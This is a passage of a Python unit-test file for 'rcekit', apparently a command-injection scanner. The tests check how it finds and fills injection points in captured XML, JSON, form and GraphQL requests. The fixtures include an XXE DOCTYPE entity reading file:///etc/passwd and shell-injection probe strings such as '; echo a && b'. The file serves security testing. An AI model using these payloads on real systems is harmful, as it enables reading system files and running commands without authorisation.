        self.assertIn("soap:Envelope/soap:Body/getUser/note/cdata()", found)

    def test_the_bogus_form_point_is_gone(self):
        # The regression this branch exists for. An envelope must not be read
        # as `a=1&b=2`, and the one point that produced is named here so a
        # future refactor that restores the fall-through fails loudly.
        points = self._points()
        self.assertFalse([p for p in points if p.kind == "form"])
        self.assertFalse([p for p in points if p.name.startswith("<?xml")])

    def test_a_repeated_sibling_is_indexed_from_the_second(self):
        # Both `item` elements are reachable. Addressing by name alone would
        # rewrite the first for either candidate, so the second would be
        # counted as covered and tested nowhere.
        names = [p.name for p in self._xml() if "/items/" in p.name and "@" not in p.name]
        self.assertEqual(names, ["soap:Envelope/soap:Body/items/item",
                                 "soap:Envelope/soap:Body/items/item[2]"])
        self.assertIn("<item sku=\"a1\">FUZZ</item>",
                      self._place("soap:Envelope/soap:Body/items/item")[2])
        self.assertIn("<item sku=\"b2\">FUZZ</item>",
                      self._place("soap:Envelope/soap:Body/items/item[2]")[2])

    def test_namespace_declarations_are_not_candidates(self):
        # A payload in a namespace URI renames the element instead of reaching
        # anything that reads a value.
        self.assertFalse([p for p in self._xml() if p.name.endswith("@xmlns:soap")])

    def test_placement_changes_the_value_and_nothing_else(self):
        _target, _headers, body = self._place("soap:Envelope/soap:Body/getUser/name")
        self.assertIn("<name>FUZZ</name>", body)
        # Byte for byte outside the span: a signed or whitespace-significant
        # envelope has to survive, which is why the document is spliced rather
        # than parsed and re-emitted.
        self.assertEqual(body.replace("FUZZ", "alice"), self.body)

    def test_an_attribute_keeps_the_quoting_style_it_was_captured_with(self):
        self.assertIn("realm='FUZZ'", self._place("soap:Envelope/soap:Body/getUser/@realm")[2])
        self.assertIn('id="FUZZ"', self._place("soap:Envelope/soap:Body/getUser/@id")[2])

    def test_a_point_that_no_longer_describes_the_body_places_nothing(self):
        # Offsets from another capture would otherwise overwrite whatever
        # happens to sit at them here.
        point = rcekit.InjectionPoint("xml", "soap:Envelope/soap:Body/getUser/name",
                                      "x", (3, 9))
        self.assertIsNone(rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.body, point, "FUZZ"))

    def test_a_signed_envelope_yields_no_xml_point(self):
        # Rewriting any byte breaks the digest, so every probe would come back
        # refused for a reason that has nothing to do with the sink.
        signed = SOAP_BODY.replace(
            "<soap:Body>",
            '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
            "<ds:SignatureValue>AA==</ds:SignatureValue></ds:Signature><soap:Body>")
        head = RAW_SOAP.split("\r\n\r\n")[0]
        req = parse_raw_request(head + "\r\n\r\n" + signed)
        self.assertTrue(rcekit.xml_body_is_signed(signed))
        self.assertFalse([p for p in rcekit.enumerate_injection_points(req) if p.kind == "xml"])

    def test_the_kind_can_be_narrowed_away_without_the_form_branch_claiming_it(self):
        # Applying the filter inside the branch rather than on it: asking for
        # form points against an envelope finds none, instead of finding the
        # one that tests nothing.
        self.assertFalse([p for p in self._points(kinds=("form",)) if p.kind in ("xml", "form")])
        self.assertTrue(self._xml(kinds=("xml",)))

    def test_a_doctype_with_an_internal_subset_does_not_swallow_the_document(self):
        # The capture an XXE test is built from. Every entity declaration ends
        # in `>`, so the first `>` is not the end of the DOCTYPE.
        body = ('<?xml version="1.0"?>'
                '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
                "<root><a>hi</a></root>")
        self.assertEqual([(k, p) for k, p, _s, _e in rcekit._xml_value_spans(body)],
                         [("text", "root/a")])

    def test_a_plain_doctype_before_a_cdata_section_does_not_swallow_it(self):
        # `]]>` contains `]>`, so looking for the subset's close anywhere after
        # the DOCTYPE finds the CDATA's and skips the body with it.
        body = ('<?xml version="1.0"?><!DOCTYPE foo SYSTEM "f.dtd">'
                "<root><a><![CDATA[x]]></a><b>bee</b></root>")
        self.assertEqual([p for _k, p, _s, _e in rcekit._xml_value_spans(body)],
                         ["root/a/cdata()", "root/b"])

    def test_the_scanner_never_raises_on_a_capture_it_cannot_read(self):
        # The input is whatever the operator captured, and a document that
        # does not close a tag is still the one carrying the sink.
        for broken in ("<a><b>x", "<<<>>>", "<!--", "<![CDATA[x", "<?xml", "", "<a/>",
                       "<a attr=unquoted>x</a>", "</a>", "<a>" * 500):
            self.assertIsInstance(rcekit._xml_value_spans(broken), list, broken)

    def test_the_span_count_is_bounded(self):
        body = "<root>" + "".join(f"<n>{i}</n>" for i in range(400)) + "</root>"
        self.assertEqual(len(rcekit._xml_value_spans(body)), rcekit._XML_SPAN_LIMIT)


class XmlSignatureDetectionTestCase(unittest.TestCase):
    """A signature is an element *in* a namespace, and neither half decides it.

    Reading the namespace URI alone suppressed every point in a document that
    merely predeclared the prefix -- which plenty of WS-* schemas do on the
    envelope root whether or not anything is signed -- so a testable request
    reported that there was nothing to test. Reading the element name alone is
    the other half of the same mistake: `<Signature>` is an ordinary element in
    plenty of schemas. The cases below are deliberately near neighbours of each
    other, because a guard like this does not break on an obvious stranger."""

    def _points(self, body):
        req = parse_raw_request("POST /s HTTP/1.1\r\nHost: t.example\r\n"
                                "Content-Type: text/xml\r\n\r\n" + body)
        return [p.name for p in rcekit.enumerate_injection_points(req) if p.kind == "xml"]

    def test_a_declared_but_unused_prefix_is_not_a_signature(self):
        # The finding. A schema that predeclares the prefix on the root is not
        # a signed document, and suppressing its points reports a testable
        # request as having nothing to test.
        body = ('<root xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
                "<cmd>x</cmd></root>")
        self.assertFalse(rcekit.xml_body_is_signed(body))
        self.assertEqual(self._points(body), ["root/cmd"])

    def test_the_namespace_uri_in_text_content_is_not_a_signature(self):
        body = ("<root><note>see http://www.w3.org/2000/09/xmldsig# for details</note>"
                "<cmd>x</cmd></root>")
        self.assertFalse(rcekit.xml_body_is_signed(body))
        self.assertIn("root/cmd", self._points(body))

    def test_an_element_named_signature_outside_the_namespace_is_not_one(self):
        # The other half. Deciding on the name would call this signed.
        body = "<root><Signature>abc</Signature><cmd>x</cmd></root>"
        self.assertFalse(rcekit.xml_body_is_signed(body))
        self.assertIn("root/cmd", self._points(body))

    def test_a_signature_element_bound_to_another_namespace_is_not_one(self):
        body = '<root xmlns:s="urn:other"><s:Signature>a</s:Signature><cmd>x</cmd></root>'
        self.assertFalse(rcekit.xml_body_is_signed(body))
        self.assertIn("root/cmd", self._points(body))

    def test_a_prefixed_signature_in_the_dsig_namespace_is_one(self):
        body = ('<root xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
                "<ds:Signature>a</ds:Signature><cmd>x</cmd></root>")
        self.assertTrue(rcekit.xml_body_is_signed(body))
        self.assertEqual(self._points(body), [])

    def test_a_default_namespaced_signature_is_one(self):
        # The declaration sits on the Signature element itself, which is how
        # a detached signature is usually written.
        body = ('<root><Signature xmlns="http://www.w3.org/2000/09/xmldsig#">a</Signature>'
                "<cmd>x</cmd></root>")
        self.assertTrue(rcekit.xml_body_is_signed(body))
        self.assertEqual(self._points(body), [])

    def test_a_prefix_bound_on_the_signature_element_itself_is_one(self):
        body = ('<Envelope><ds:Signature '
                'xmlns:ds="http://www.w3.org/2000/09/xmldsig#"/><cmd>x</cmd></Envelope>')
        self.assertTrue(rcekit.xml_body_is_signed(body))
        self.assertEqual(self._points(body), [])

    def test_a_body_without_the_namespace_at_all_short_circuits(self):
        self.assertFalse(rcekit.xml_body_is_signed("<root><cmd>x</cmd></root>"))
        self.assertFalse(rcekit.xml_body_is_signed(""))
        self.assertFalse(rcekit.xml_body_is_signed(None))

    def test_a_commented_out_signature_example_is_not_a_signature(self):
        # The regex scan reads the whole document, so an example in a comment
        # counted as markup -- the same wrong answer, in the same direction, as
        # the URI-substring test this check replaced.
        body = (f'<Envelope xmlns:ds="{rcekit._XML_DSIG_NS}">'
                "<!-- a signed request puts <ds:Signature> here -->"
                "<Body><cmd>x</cmd></Body></Envelope>")
        self.assertFalse(rcekit.xml_body_is_signed(body))
        self.assertEqual(self._points(body), ["Envelope/Body/cmd"])

    def test_a_signature_inside_cdata_is_not_a_signature(self):
        body = (f'<Envelope xmlns:ds="{rcekit._XML_DSIG_NS}">'
                "<doc><![CDATA[<ds:Signature>example</ds:Signature>]]></doc>"
                "<Body><cmd>x</cmd></Body></Envelope>")
        self.assertFalse(rcekit.xml_body_is_signed(body))
        self.assertIn("Envelope/Body/cmd", self._points(body))

    def test_a_declaration_only_inside_a_comment_binds_no_prefix(self):
        body = (f'<Envelope><!-- xmlns:ds="{rcekit._XML_DSIG_NS}" -->'
                "<ds:Signature/><Body><cmd>x</cmd></Body></Envelope>")
        self.assertFalse(rcekit.xml_body_is_signed(body))

    def test_a_real_signature_after_an_inert_region_is_still_found(self):
        # The near neighbours of the three above: blanking the inert regions
        # must not blank the markup around them.
        for inert in ("<!-- note -->", "<d><![CDATA[a]]></d>",
                      "<d><![CDATA[contains ]]> a delimiter]]></d>"):
            body = (f'<Envelope xmlns:ds="{rcekit._XML_DSIG_NS}">{inert}'
                    "<ds:Signature>a</ds:Signature><Body><cmd>x</cmd></Body></Envelope>")
            self.assertTrue(rcekit.xml_body_is_signed(body), inert)
            self.assertEqual(self._points(body), [], inert)

    def test_blanking_inert_regions_preserves_the_document_length(self):
        body = "<a><!-- hidden --><b><![CDATA[more]]></b></a>"
        self.assertEqual(len(rcekit._xml_without_inert(body)), len(body))
        self.assertNotIn("hidden", rcekit._xml_without_inert(body))
        self.assertNotIn("more", rcekit._xml_without_inert(body))
        self.assertIn("<b>", rcekit._xml_without_inert(body))

    def test_an_unterminated_inert_region_blanks_to_the_end(self):
        # Never raises, for the same reason the span scanner does not.
        self.assertEqual(len(rcekit._xml_without_inert("<a><!-- open")), len("<a><!-- open"))
        self.assertEqual(len(rcekit._xml_without_inert("<a><![CDATA[open")),
                         len("<a><![CDATA[open"))


class XmlPointCarriesItsOwnEncodingTestCase(unittest.TestCase):
    """The marker cannot be located to work out the escaping.

    The delivery layer replaces *every* occurrence of `FUZZ`, so a capture that
    already contains a literal `FUZZ` of its own has two, and the first one is
    not the point under test. Reading the first picked that other span's shape:
    a probe aimed at element text was escaped as CDATA, so its `&` went on the
    wire bare and the target refused to parse the document -- a whole sink
    answering `negative` for a reason that has nothing to do with the sink.

    XML is the only kind this can happen to, because it is the only one whose
    encoding depends on *where* in the body the value sits rather than on what
    the body is. So the point carries its own shape and the engine is told,
    instead of searching for it."""

    CAPTURE = ("POST /s HTTP/1.1\r\nHost: t.example\r\n"
               "Content-Type: text/xml\r\n\r\n"
               "<root><doc><![CDATA[FUZZ]]></doc><cmd>alice</cmd></root>")

    def setUp(self):
        self.kit = RCEKit()
        self.points = [p for p in
                       rcekit.enumerate_injection_points(parse_raw_request(self.CAPTURE))
                       if p.kind == "xml"]

    def test_each_xml_point_declares_its_own_shape(self):
        self.assertEqual({p.name: p.span for p in self.points},
                         {"root/doc/cdata()": "cdata", "root/cmd": "text"})

    def test_a_non_xml_point_declares_no_shape(self):
        # Its escaping is a property of the body, not of the position.
        req = parse_raw_request("POST /s HTTP/1.1\r\nHost: t.example\r\n"
                                "Content-Type: application/json\r\n\r\n"
                                '{"cmd": "alice"}')
        point = next(p for p in rcekit.enumerate_injection_points(req) if p.kind == "json")
        self.assertEqual(point.span, "")

    def test_the_point_supplied_encoder_keeps_the_document_well_formed(self):
        target = next(p for p in self.points if p.name == "root/cmd")
        url, _m, data, hdrs, _l = rcekit.build_request_inputs(self.CAPTURE, point=target)
        _t, rendered, _h = self.kit._build_verify_request(
            "; echo a && b", url, data, hdrs, "query_value", f"xml_{target.span}")
        body = rendered.decode()
        self.assertIn("<cmd>; echo a &amp;&amp; b</cmd>", body)
        self.assertNotIn("&& b</cmd>", body, "a bare & in element text is not well-formed")

    def test_locating_the_marker_declines_when_two_shapes_claim_it(self):
        # Rather than guessing one and mis-escaping silently. `raw` is what an
        # XML body got before any of this existed, and --verify-body-location
        # settles it.
        _u, _m, data, hdrs, _l = rcekit.build_request_inputs(
            self.CAPTURE, point=next(p for p in self.points if p.name == "root/cmd"))
        self.assertEqual(data.count("FUZZ"), 2, "the capture's own marker is still there")
        self.assertEqual(self.kit._detect_body_location(data, hdrs), "raw")

    def test_an_unambiguous_inline_marker_is_still_located(self):
        for body, want in [('<a id="FUZZ"><b>x</b></a>', "xml_attr"),
                           ("<a><b>FUZZ</b></a>", "xml_text"),
                           ("<a><b><![CDATA[FUZZ]]></b></a>", "xml_cdata"),
                           # Two markers of the same shape are not ambiguous:
                           # both want the same escaping.
                           ("<a><b>FUZZ</b><c>FUZZ</c></a>", "xml_text")]:
            self.assertEqual(
                self.kit._detect_body_location(body, ["Content-Type: text/xml"]), want, body)

    def test_all_occurrences_finds_every_marker_not_just_the_first(self):
        self.assertEqual(rcekit._all_occurrences("aXbXc", "X"), [1, 3])
        self.assertEqual(rcekit._all_occurrences("XX", "X"), [0, 1])
        self.assertEqual(rcekit._all_occurrences("abc", "X"), [])
        self.assertEqual(rcekit._all_occurrences("abc", ""), [])


class XmlEmptyLeafValueTestCase(unittest.TestCase):
    """An empty field is still a field.

    `<cmd></cmd>` and `<cmd>   </cmd>` are the ordinary shape of a value in a
    SOAP template, and a JSON `""` leaf and a form `key=` are both candidates
    already -- XML was the only carrier that dropped them, so an envelope of
    placeholders could report no body injection points at all.

    The rule is not "is this text blank", because that answers the same for a
    placeholder field and for the indentation of a pretty-printed envelope. It
    is "did this element have an element child", and the pretty-printed parent
    below is the near neighbour that tells the two apart."""

    def _spans(self, body):
        return [(kind, path) for kind, path, _s, _e in rcekit._xml_value_spans(body)]

    def test_an_empty_leaf_is_a_candidate(self):
        self.assertEqual(self._spans("<root><cmd></cmd></root>"), [("text", "root/cmd")])

    def test_a_whitespace_only_leaf_is_a_candidate(self):
        self.assertEqual(self._spans("<root><cmd>   </cmd></root>"), [("text", "root/cmd")])

    def test_a_pretty_printed_parent_is_not_a_candidate(self):
        # Its whitespace is indentation. This is the case the blank test could
        # not tell from the two above.
        body = "<Body>\n  <getUser>\n    <n>a</n>\n  </getUser>\n</Body>"
        self.assertEqual(self._spans(body), [("text", "Body/getUser/n")])

    def test_a_leaf_with_a_value_yields_exactly_one_span(self):
        # The closing tag must not add a second, empty one beside the value.
        self.assertEqual(self._spans("<root><cmd>x</cmd></root>"), [("text", "root/cmd")])

    def test_a_cdata_leaf_yields_only_its_cdata_span(self):
        self.assertEqual(self._spans("<note><![CDATA[free text]]></note>"),
                         [("cdata", "note/cdata()")])
        self.assertEqual(self._spans("<note><![CDATA[]]></note>"),
                         [("cdata", "note/cdata()")])

    def test_mixed_content_keeps_both_of_its_text_runs(self):
        self.assertEqual(self._spans("<a>x<b/>y</a>"), [("text", "a"), ("text", "a")])

    def test_a_self_closing_element_is_not_a_candidate(self):
        # It has no text node, so rewriting it would test a shape the
        # application never sends -- the reason _set_json_tokens refuses to
        # create a key that was not there.
        self.assertEqual(self._spans("<root><cmd/></root>"), [])

    def test_an_empty_span_places_the_payload_between_the_tags(self):
        body = "<root><cmd></cmd></root>"
        req = parse_raw_request("POST /s HTTP/1.1\r\nHost: t.example\r\n"
                                "Content-Type: text/xml\r\n\r\n" + body)
        point = next(p for p in rcekit.enumerate_injection_points(req) if p.kind == "xml")
        self.assertEqual(point.tokens[0], point.tokens[1], "the span is zero-length")
        _t, _h, placed = rcekit.place_injection_point(
            req["target"], req["headers"], body, point, "FUZZ")
        self.assertEqual(placed, "<root><cmd>FUZZ</cmd></root>")

    def test_the_shipped_envelope_gains_no_spurious_span(self):
        # The regression guard for the restructuring: the SOAP fixture's spans
        # are what they were before the closing tag learned to emit.
        self.assertEqual(
            self._spans(SOAP_BODY),
            [("attr", "soap:Envelope/soap:Body/getUser/@id"),
             ("attr", "soap:Envelope/soap:Body/getUser/@realm"),
             ("text", "soap:Envelope/soap:Body/getUser/name"),
             ("cdata", "soap:Envelope/soap:Body/getUser/note/cdata()"),
             ("attr", "soap:Envelope/soap:Body/items/item/@sku"),
             ("text", "soap:Envelope/soap:Body/items/item"),
             ("attr", "soap:Envelope/soap:Body/items/item[2]/@sku"),
             ("text", "soap:Envelope/soap:Body/items/item[2]")])


class JsonByteOrderMarkTestCase(unittest.TestCase):
    """A marked JSON capture yielded no body point at all.

    The same U+FEFF that sent an XML body down the form branch sent a JSON body
    nowhere: `str.strip()` leaves the mark, so the test on the first character
    said "not JSON", and `-p NAME` could not reach a JSON field either. Fixing
    that test alone would not have been enough — `json.loads` rejects the mark
    outright ("Unexpected UTF-8 BOM"), so the branch and the parse had to agree.

    The cases below assert the four observable outcomes together rather than one
    each, because the failure this bug had was precisely that one site tolerated
    the mark and the next rejected it."""

    BOM = "\ufeff"

    def setUp(self):
        self.body = self.BOM + '{"note": "x", "cmd": "alice"}'
        self.raw = ("POST /api HTTP/1.1\r\nHost: t.example\r\n"
                    "Content-Type: application/json\r\n\r\n" + self.body)
        self.req = parse_raw_request(self.raw)
        self.kit = RCEKit()

    def test_the_mark_defeats_strip_and_json_loads_alike(self):
        # Why the fix is two things and not one.
        self.assertEqual(self.BOM.strip(), self.BOM)
        with self.assertRaises(ValueError):
            json.loads(self.BOM + "{}")
        self.assertEqual(rcekit.strip_bom(self.BOM + "{}"), "{}")
        self.assertEqual(rcekit.strip_bom("{}"), "{}")
        self.assertEqual(rcekit.strip_bom(None), "")

    def test_every_path_agrees_that_a_marked_body_is_json(self):
        points = rcekit.enumerate_injection_points(self.req)
        self.assertEqual([p.name for p in points if p.kind == "json"], ["note", "cmd"])
        self.assertFalse([p for p in points if p.kind == "form"],
                         "a marked JSON body must not fall through to the form branch")
        target = next(p for p in points if p.kind == "json" and p.name == "cmd")
        _u, _m, data, hdrs, label = rcekit.build_request_inputs(self.raw, point=target)
        self.assertEqual(label, "JSON field 'cmd'")
        self.assertEqual(self.kit._detect_body_location(data, hdrs), "json_string")
        # -p NAME goes through its own branch and its own parse.
        _u, _m, by_name, _h, injection = rcekit.build_request_inputs(self.raw, param="cmd")
        self.assertEqual(injection, "JSON field 'cmd'")
        self.assertIn('"cmd": "FUZZ"', by_name)

    def test_the_mark_is_sent_back_as_captured(self):
        # This path re-serialises, so the mark would otherwise be dropped. The
        # capture carried it and the application accepted it.
        target = next(p for p in rcekit.enumerate_injection_points(self.req)
                      if p.kind == "json" and p.name == "cmd")
        _t, _h, placed = rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.body, target, "FUZZ")
        self.assertTrue(placed.startswith(self.BOM), repr(placed))
        self.assertIn('"cmd": "FUZZ"', placed)
        self.assertIn('"note": "x"', placed)

    def test_an_unmarked_capture_gains_no_mark(self):
        # The near neighbour, and the one every other test in this file uses.
        plain = '{"note": "x", "cmd": "alice"}'
        raw = ("POST /api HTTP/1.1\r\nHost: t.example\r\n"
               "Content-Type: application/json\r\n\r\n" + plain)
        _u, _m, data, _h, _l = rcekit.build_request_inputs(raw, param="cmd")
        self.assertEqual(data, '{"note": "x", "cmd": "FUZZ"}')
        self.assertFalse(data.startswith(self.BOM))
        self.assertEqual(rcekit._restore_bom(plain, "{}"), "{}")
        self.assertEqual(rcekit._restore_bom(self.BOM + plain, "{}"), self.BOM + "{}")

    def test_a_marked_xml_capture_still_works_through_the_shared_helper(self):
        # Both carriers now ask the same helper, so a regression in it would
        # take out the XML branch the same way.
        raw = ("POST /s HTTP/1.1\r\nHost: t.example\r\nContent-Type: text/xml\r\n\r\n"
               + self.BOM + '<?xml version="1.0"?><root><cmd>x</cmd></root>')
        points = rcekit.enumerate_injection_points(parse_raw_request(raw))
        self.assertEqual([p.name for p in points if p.kind == "xml"], ["root/cmd"])
        self.assertFalse([p for p in points if p.kind == "form"])

    def test_a_marked_body_that_is_neither_is_untouched(self):
        # A mark is not a licence to guess: a body that is not JSON or XML with
        # it stripped still goes through the paths it did before.
        self.assertEqual(
            self.kit._detect_body_location(self.BOM + "a=1&b=2", []), "form_value")
        self.assertEqual(self.kit._detect_body_location(self.BOM + "opaque", []), "raw")

    def test_whitespace_after_the_mark_does_not_hide_the_body(self):
        """The order of the two strips is the whole of this case.

        `str.strip()` stops at a mark, because U+FEFF is not whitespace, so
        stripping first leaves a newline still in front of the delimiter and
        every test on the first character says "not JSON" about a document
        `json.loads` accepts. That is the same branch-disagrees-with-parse
        failure the mark handling exists to end, reached by writing the rule
        correctly and the order backwards."""
        self.assertEqual(rcekit.strip_bom_then_space(self.BOM + "\n{}"), "{}")
        self.assertEqual(rcekit.strip_bom_then_space("  \n{}  "), "{}")
        self.assertEqual(rcekit.strip_bom_then_space(None), "")
        # The order, stated as the thing that goes wrong without it.
        wrong_order = rcekit.strip_bom((self.BOM + "\n{}").strip())
        self.assertEqual(wrong_order, "\n{}",
                         "stripping whitespace first cannot reach past the mark")
        self.assertNotIn(wrong_order[:1], "{[",
                         "which is why every shape test said 'not JSON'")
        self.assertEqual(rcekit.strip_bom_then_space(self.BOM + "\n{}")[:1], "{")

        for ctype, body, kind, want in [
            ("application/json", '{"cmd": "x", "note": "y"}', "json", ["cmd", "note"]),
            ("text/xml", "<root><cmd>x</cmd></root>", "xml", ["root/cmd"]),
        ]:
            raw = (f"POST /api HTTP/1.1\r\nHost: t.example\r\n"
                   f"Content-Type: {ctype}\r\n\r\n" + self.BOM + "\n" + body)
            points = rcekit.enumerate_injection_points(parse_raw_request(raw))
            self.assertEqual([p.name for p in points if p.kind == kind], want, ctype)
            self.assertFalse([p for p in points if p.kind == "form"], ctype)

    def test_whitespace_after_the_mark_does_not_hide_a_named_parameter(self):
        raw = ("POST /api HTTP/1.1\r\nHost: t.example\r\n"
               "Content-Type: application/json\r\n\r\n"
               + self.BOM + '\n{"cmd": "x"}')
        _u, _m, data, _h, injection = rcekit.build_request_inputs(raw, param="cmd")
        self.assertEqual(injection, "JSON field 'cmd'")
        self.assertIn('"cmd": "FUZZ"', data)

    def test_a_form_key_behind_the_mark_is_addressable_and_readable(self):
        """A mark sits in front of the *first* key, where it is an artefact of
        how the body was encoded rather than part of the field name.

        The point is therefore named without it -- so a report does not print an
        invisible character and `-p NAME` addresses what the operator can read --
        while the body keeps its own bytes, because a urlencoded parser on the
        far side sees the mark too and a key RCEKit rewrote is a key it
        changed."""
        raw = ("POST /api HTTP/1.1\r\nHost: t.example\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
               + self.BOM + "cmd=alice&note=x")
        points = rcekit.enumerate_injection_points(parse_raw_request(raw))
        self.assertEqual([p.name for p in points if p.kind == "form"], ["cmd", "note"])
        _u, _m, data, _h, injection = rcekit.build_request_inputs(raw, param="cmd")
        self.assertEqual(injection, "body param 'cmd'")
        # The key goes on the wire as captured, mark and all.
        self.assertEqual(data, self.BOM + "cmd=FUZZ&note=x")

    def test_an_unmarked_form_key_is_matched_exactly_as_before(self):
        # The near neighbour: tolerating a mark on the comparison must not make
        # the match loose for anything else.
        self.assertEqual(rcekit._mark_urlencoded_param("cmd=a&note=b", "cmd", "F"),
                         "cmd=F&note=b")
        self.assertIsNone(rcekit._mark_urlencoded_param("cmd=a", "cm", "F"))
        self.assertIsNone(rcekit._mark_urlencoded_param("cmd=a", "cmdx", "F"))
        self.assertEqual(
            rcekit._mark_urlencoded_param(self.BOM + "cmd=a", self.BOM + "cmd", "F"),
            self.BOM + "cmd=F", "the captured spelling must still match itself")


class XmlByteOrderMarkTestCase(unittest.TestCase):
    """A byte-order mark is not whitespace, and `str.strip()` leaves it in.

    The cost is not a missed point but the wrong branch: a body with a prolog
    contains `=`, so a capture whose XML begins with U+FEFF fell through to the
    form branch and produced the single bogus point named after the prolog --
    the exact point the xml kind exists to replace. .NET clients emit a mark
    routinely."""

    BOM = "\ufeff"

    def test_the_mark_survives_strip_which_is_why_this_case_exists(self):
        self.assertEqual(self.BOM.strip(), self.BOM)
        self.assertFalse(self.BOM.isspace())

    def test_a_marked_envelope_is_enumerated_as_xml(self):
        body = self.BOM + '<?xml version="1.0"?><root><cmd>x</cmd></root>'
        req = parse_raw_request("POST /s HTTP/1.1\r\nHost: t.example\r\n"
                                "Content-Type: text/xml\r\n\r\n" + body)
        points = rcekit.enumerate_injection_points(req)
        self.assertEqual([p.name for p in points if p.kind == "xml"], ["root/cmd"])
        self.assertFalse([p for p in points if p.kind == "form"],
                         "the prolog must not come back as a form point")

    def test_a_marked_body_picks_an_xml_encoding_with_or_without_the_type(self):
        kit = RCEKit()
        marked = self.BOM + "<root><cmd>FUZZ</cmd></root>"
        self.assertEqual(kit._detect_body_location(marked, ["Content-Type: text/xml"]),
                         "xml_text")
        # Without an XML content type the first character was the only signal,
        # so this is the half that was wrong on its own.
        self.assertEqual(
            kit._detect_body_location(marked, ["Content-Type: application/octet-stream"]),
            "xml_text")

    def test_an_unmarked_body_is_unaffected(self):
        kit = RCEKit()
        self.assertEqual(
            kit._detect_body_location("<root><cmd>FUZZ</cmd></root>",
                                      ["Content-Type: text/xml"]), "xml_text")
        self.assertTrue(rcekit.starts_xml_body("<a/>"))
        self.assertFalse(rcekit.starts_xml_body("a=1"))
        self.assertFalse(rcekit.starts_xml_body(""))


class XmlBodyLocationTestCase(unittest.TestCase):
    """The escaping an XML payload needs is a property of its *position*.

    A payload in an attribute has to escape the quote that delimits it; one in
    character data does not; one inside CDATA must not be escaped at all or the
    sink receives `&amp;&amp;` literally. Sent raw, a single `&` or `<` makes
    the body not-well-formed and the request is rejected before anything reads
    the value -- a whole class of sink answering `negative` for a reason that
    has nothing to do with the sink."""

    def setUp(self):
        self.kit = RCEKit()
        self.req = parse_raw_request(RAW_SOAP)

    def _location_for(self, name):
        point = next(p for p in rcekit.enumerate_injection_points(self.req)
                     if p.kind == "xml" and p.name == name)
        _url, _method, data, headers, _label = rcekit.build_request_inputs(
            RAW_SOAP, point=point)
        return self.kit._detect_body_location(data, headers)

    def test_each_shape_of_value_picks_its_own_encoding(self):
        self.assertEqual(self._location_for("soap:Envelope/soap:Body/getUser/name"),
                         "xml_text")
        self.assertEqual(self._location_for("soap:Envelope/soap:Body/getUser/@id"),
                         "xml_attr")
        self.assertEqual(self._location_for("soap:Envelope/soap:Body/getUser/note/cdata()"),
                         "xml_cdata")

    def test_character_data_is_escaped_so_the_parser_hands_the_sink_the_payload(self):
        encoded = self.kit._encode_for_location("; echo a && b <c>", "xml_text")
        self.assertEqual(encoded, "; echo a &amp;&amp; b &lt;c&gt;")

    def test_an_attribute_also_escapes_both_quotes(self):
        encoded = self.kit._encode_for_location("""a"b'c""", "xml_attr")
        self.assertEqual(encoded, "a&quot;b&apos;c")

    def test_cdata_is_left_alone_except_for_the_sequence_that_ends_it(self):
        self.assertEqual(self.kit._encode_for_location("; echo a && b", "xml_cdata"),
                         "; echo a && b")
        # Split across a section boundary, so the bytes the sink receives are
        # unchanged while the section stays open.
        self.assertEqual(self.kit._encode_for_location("x]]>y", "xml_cdata"),
                         "x]]]]><![CDATA[>y")

    def test_an_xml_body_with_no_recognisable_span_falls_through_to_raw(self):
        # Better than guessing an escaping for a marker the scanner cannot
        # place: an envelope the application scrapes with a regex rather than
        # parses needs the payload verbatim.
        self.assertEqual(
            self.kit._detect_body_location("<root><a>x</a></root>",
                                           ["Content-Type: text/xml"]),
            "raw")

    def test_a_json_body_is_still_json_even_with_a_tag_inside_a_string(self):
        self.assertEqual(
            self.kit._detect_body_location('{"a": "<b>FUZZ</b>"}',
                                           ["Content-Type: application/json"]),
            "json_string")

    def test_an_inline_marker_in_a_hand_written_envelope_is_located_too(self):
        # --verify-data with its own FUZZ gets the same treatment as an
        # enumerated point.
        self.assertEqual(
            self.kit._detect_body_location('<a id="FUZZ"><b>x</b></a>',
                                           ["Content-Type: application/soap+xml"]),
            "xml_attr")


class GraphQLPointOrderTestCase(unittest.TestCase):
    """A GraphQL POST spends most of its budget where nothing can be confirmed.

    `variables` carries the values the operation is called with, and those reach
    resolvers. `query` is the operation document itself: a payload there
    *replaces* it, so the server answers with a parse error before a resolver
    runs, and `operationName` then names an operation that is no longer in the
    document. On the capture this was measured against, those two were two
    points of five -- each one a full probe ladder.

    They are reordered, never dropped. A server that logs the query document
    before parsing it is reachable through exactly that field, which is the
    route Log4Shell took through access logs.
    """

    PAYLOAD = {
        "operationName": "Search",
        "query": "query Search($term: String!) { search(term: $term) { id } }",
        "variables": {"term": "hello", "limit": 10, "filter": {"lang": "en"}},
    }

    def _names(self, payload):
        return [p.name for p in rcekit.enumerate_injection_points(
            _graphql_capture(payload)) if p.kind == "json"]

    def test_variables_are_tried_before_the_operation_document(self):
        names = self._names(self.PAYLOAD)
        self.assertLess(names.index("variables.filter.lang"), names.index("query"))
        self.assertLess(names.index("variables.term"), names.index("operationName"))

    def test_nothing_is_dropped_and_the_structural_fields_come_last(self):
        # Reach is not traded for yield: a full run still tests both.
        names = self._names(self.PAYLOAD)
        self.assertEqual(sorted(names),
                         sorted(["operationName", "query", "variables.term",
                                 "variables.limit", "variables.filter.lang"]))
        self.assertEqual(names[-2:], ["operationName", "query"])

    def test_variables_keep_their_document_order_among_themselves(self):
        names = self._names(self.PAYLOAD)
        self.assertEqual(names[:3],
                         ["variables.term", "variables.limit", "variables.filter.lang"])

    def test_a_search_api_carrying_both_keys_is_not_treated_as_graphql(self):
        """The keys alone do not make it GraphQL.

        A search API posting `{"query": "red shoes", "variables": {...}}` has a
        real injection point in `query`. Demoting it behind every variable is
        one that a bounded `--max-points` run drops outright -- reach traded
        away on a guess about the endpoint."""
        names = self._names({"query": "red shoes",
                             "variables": {"size": 42, "colour": "red"}})
        self.assertEqual(names[0], "query",
                         f"a search body was reordered as GraphQL: {names}")

    def test_a_query_that_is_a_keyword_without_a_selection_set_is_not_a_document(self):
        names = self._names({"query": "mutation", "variables": {"a": 1}})
        self.assertEqual(names[0], "query")

    def test_the_shorthand_form_is_still_recognised(self):
        # `{ me { id } }` carries no operation keyword and is a GraphQL
